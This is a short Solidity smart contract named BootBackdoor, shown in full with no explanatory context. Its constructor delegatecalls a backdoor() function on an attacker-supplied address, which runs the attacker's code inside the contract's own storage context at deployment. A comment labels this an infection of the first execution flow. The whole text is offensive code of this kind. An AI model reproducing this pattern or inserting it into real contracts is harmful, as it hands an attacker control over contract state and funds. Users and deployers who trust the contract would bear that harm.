contract BootBackdoor {
    address public safe;
    address public attacker;

    constructor(address _safe, address _attacker) {
        safe = _safe;
        attacker = _attacker;

        // Infects the first execution flow
        (bool ok, ) = attacker.delegatecall(
            abi.encodeWithSignature("backdoor()")
        );
        require(ok, "Infection failed");
    }
}
